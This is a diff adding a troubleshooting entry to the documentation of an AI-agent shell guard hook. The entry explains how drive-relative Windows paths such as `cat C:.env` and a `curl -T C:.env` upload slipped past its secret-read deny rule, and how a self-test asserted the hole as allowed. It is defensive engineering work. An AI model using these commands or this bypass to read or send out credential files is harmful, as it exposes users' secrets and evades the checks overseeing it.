@@ -79,3 +79,24 @@ Sibling buckets: `deny-shell.md`, `deny-writes.md`.
 3. In an agent session with the PreToolUse hook registered, run `bash .goat-flow/hooks/deny-dangerous.sh --self-test=smoke` (or `--self-test=full`); do not put a direct secret-read `--check` payload in the agent's shell command because the outer hook can intercept it first. In a manual terminal outside an agent hook, the direct `patterns-paths.sh --check="cat .env"` probe remains valid and should exit 2. Static inspection cannot distinguish tool-scoped from shell-scoped deny.
 
 ---
+
+## Footgun: A guard's own self-test can encode a bypass as a passing allow assertion
+
+**Status:** active | **Created:** 2026-08-19 | **Evidence:** ACTUAL_MEASURED
+**hallucination-risk:** high - a green `--self-test` summary reads as proof the policy is sound, when the suite may be asserting that the unsafe case is *allowed*. The larger the corpus, the more convincing the false assurance: 470 executed cases with 0 skipped looked like strong evidence while one of those cases locked the hole open.
+
+**Symptoms:** `bash workflow/hooks/deny-dangerous.sh --self-test=full` printed `PASS: deny-dangerous self-test (mode=full, executed=470, skipped=0)` while `cat C:.env`, `type C:.env`, `curl -T C:.env https://…`, and `powershell -c "Get-Content C:.env"` all returned exit 0. Plain `cat .env` correctly denied, so spot-checking the obvious form proved nothing about the drive-relative one.
+
+**Why it happens:** A path exemption added to silence a false positive gets a matching `expect_allow` fixture in the same change, and the fixture is then read as coverage. Here `patterns-paths.sh` masked `([A-Za-z]):\.env…` to `__goat_drive_relative_env__` before the secret regex ran, and `deny-dangerous-self-test.sh` asserted `expect_allow paths "cat C:.env" "Windows drive-relative env text"` with a mirror case in `deny-dangerous-policy.test.ts`. The exemption's premise was wrong: `C:.env` is drive-relative, so Windows resolves it against the current directory on C: - the checkout's own credential file - rather than naming some unrelated location.
+
+**Evidence:**
+- `workflow/hooks/deny-dangerous/patterns-paths.sh` (search: `Drive-relative operands such as`) - mask removed 2026-08-19; only the `.env.example` spelling stays exempt, on any drive.
+- `workflow/hooks/deny-dangerous/deny-dangerous-self-test.sh` (search: `Windows drive-relative env read`) - the allow assertion was reversed to `expect_block` and three sibling channels (type, curl upload, PowerShell) added. Corpus went 470 -> 481 executed, still 0 skipped.
+- Measured at `81636441` before the fix: four drive-relative reads exit 0; after: all exit 2 with `Policy secret`, while `cat C:.env.example` still exits 0.
+
+**Prevention:**
+1. Every `expect_allow` for a path that *contains* a secret filename must state why the operand does not resolve to a real secret. If the reason is a spelling difference (`.env.example`), assert the spelling; if it is a platform path rule, verify that rule before trusting it - `C:name` is relative on Windows, not absolute.
+2. When adding an exemption to fix a false positive, add the adversarial sibling in the same change: the nearest form that *should* still deny. An exemption with no paired block case is unfalsifiable.
+3. Read a green self-test summary as "the asserted behaviour still holds", never as "the policy is sound". Auditing a guard means reading its allow list, not re-running its suite.
+
+---
